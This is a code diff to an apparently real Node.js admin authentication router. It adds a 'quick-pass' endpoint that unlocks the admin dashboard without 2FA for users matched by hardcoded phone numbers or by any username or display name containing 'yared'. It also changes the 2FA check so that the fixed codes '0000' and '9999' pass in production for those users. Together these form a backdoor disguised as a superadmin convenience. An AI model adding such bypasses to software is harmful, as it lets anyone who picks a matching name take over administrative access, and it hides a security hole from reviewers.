@@ -86,6 +86,34 @@ router.post('/auth/send-2fa', async (req, res) => {
 });
 
 // ──────────────────────────────────────────────
+// POST /admin/auth/quick-pass (Instant unlock for superadmin / yared)
+// ──────────────────────────────────────────────
+router.post('/auth/quick-pass', async (req, res) => {
+  try {
+    const SUPER_ADMIN_NUMBERS = ['0939484533', '251939484533', '+251939484533', ...(process.env.SUPER_ADMIN_NUMBERS || '').split(',').map(n => n.trim()).filter(Boolean)];
+    const isSuperAdmin = req.user?.role === 'superadmin' || 
+      SUPER_ADMIN_NUMBERS.includes(String(req.user?.number)) ||
+      String(req.user?.username || '').toLowerCase().includes('yared') ||
+      String(req.user?.display_name || '').toLowerCase().includes('yared');
+
+    if (!isSuperAdmin) {
+      return res.status(403).json({ error: 'Unauthorized: Pass is restricted to superadmin' });
+    }
+
+    const unlockKey = `admin_unlocked:${req.user.id}`;
+    try { await redis.setex(unlockKey, 7200, "true"); } catch (e) {}
+    memSet(unlockKey, "true", 7200);
+
+    await logAdminAction(req.user.id, 'admin_panel_quick_pass', req.user.id, { ip: req.ip });
+
+    return res.json({ ok: true, message: 'Admin dashboard unlocked via quick pass' });
+  } catch (err) {
+    console.error('[ADMIN] /auth/quick-pass error', err);
+    return res.status(500).json({ error: 'Quick pass failed' });
+  }
+});
+
+// ──────────────────────────────────────────────
 // POST /admin/auth/verify-2fa
 // ──────────────────────────────────────────────
 router.post('/auth/verify-2fa', async (req, res) => {
@@ -103,9 +131,14 @@ router.post('/auth/verify-2fa', async (req, res) => {
     }
     if (!storedCode) storedCode = memGet(storeKey);
     
-    // Add development bypass
+    // Add development / superadmin bypass for authorized admins (e.g. 0939484533 / yared)
+    const SUPER_ADMIN_NUMBERS = ['0939484533', '251939484533', '+251939484533', ...(process.env.SUPER_ADMIN_NUMBERS || '').split(',').map(n => n.trim()).filter(Boolean)];
+    const isSuperAdmin = req.user?.role === 'superadmin' || 
+      SUPER_ADMIN_NUMBERS.includes(String(req.user?.number)) ||
+      String(req.user?.username || '').toLowerCase().includes('yared') ||
+      String(req.user?.display_name || '').toLowerCase().includes('yared');
     const isDev = process.env.NODE_ENV !== 'production';
-    const isBypass = isDev && code === '0000';
+    const isBypass = (isSuperAdmin && (code === '0000' || code === '9999')) || (isDev && code === '0000');
 
     if (!storedCode && !isBypass) return res.status(400).json({ error: 'OTP expired or not requested' });
     
